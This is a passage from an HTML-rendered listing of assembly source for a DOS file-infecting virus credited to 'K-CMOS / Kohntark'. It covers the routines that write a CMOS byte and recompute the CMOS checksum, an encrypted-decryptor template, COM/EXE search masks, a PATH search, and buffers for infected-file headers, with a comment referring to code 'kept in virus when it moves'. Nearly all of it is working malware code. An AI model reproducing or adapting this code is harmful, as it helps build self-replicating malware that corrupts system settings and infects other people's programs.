        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;send address / control byte</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">          </span><span class="sc1">;read register</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">;subtract from checksum</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;update checksum value in register.</span><span class="sc0">

</span><span class="sc1">;****************************</span><span class="sc0">
</span><span class="sc1">; Write CMOS byte to Address</span><span class="sc0">
</span><span class="sc1">;****************************</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;AL = address</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;new CMOS value =&gt; al</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS byte</span><span class="sc0">

</span><span class="sc1">;*********************</span><span class="sc0">
</span><span class="sc1">; Write CMOS Checksum</span><span class="sc0">
</span><span class="sc1">;*********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">          </span><span class="sc1">;address of checksum 's msb</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">           </span><span class="sc1">;msb of new checksum</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS msb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">          </span><span class="sc1">;address of checksum 's lsb</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;specify CMOS address</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">           </span><span class="sc1">;lsb of new checksum</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;write new CMOS lsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">NAME_AUTHOR</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'K-CM”S / K”hntark'</span><span class="sc0">

</span><span class="sc5">WORK_BUFFER</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                     </span><span class="sc1">;mov  cx,VSIZE</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                     </span><span class="sc1">;mov  si,VADDRESS</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">             </span><span class="sc1">;add WORD PTR cs:[si],KEY</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                   </span><span class="sc1">;add si,02</span><span class="sc0">
               </span><span class="sc1">;db  043h,043h                      ;inc bx, inc bx</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0F6h</span><span class="sc0">                      </span><span class="sc1">;loop add..</span><span class="sc0">

</span><span class="sc5">COM_MASK</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">EXE_MASK</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">PATH_STR</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'PATH='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">START_IMAGE</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">

</span><span class="sc5">ORIG_SSSP</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ORIG_IPCS</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COM_FLAG</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;0=COM 1=EXE</span><span class="sc0">
</span><span class="sc5">START_CODE</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;4 bytes of COM or EXE hdr goes here</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">FINAL</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;label of byte of code to be kept in virus when it moves</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">HEAP</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">START_CODE2</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">;2nd part of EXE hdr</span><span class="sc0">

</span><span class="sc5">PSP_SEG</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">PATH_ADDRESS</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FILENAME_PTR</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WORK_AREA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">),</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">DTA</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;reserved</span><span class="sc0">
</span><span class="sc5">DTA_File_Attr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Time</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Date</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DTA_File_Name</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ</span><span class="sc0">

</span><span class="sc5">ID</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc0">
</span><span class="sc5">DECRYPTOR_SIZE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16d</span><span class="sc0"> </span><span class="sc1">; equ OFFSET WORK_BUFFER - OFFSET START_IMAGE</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
     </span><span class="sc9">END</span><span class="sc0">    </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
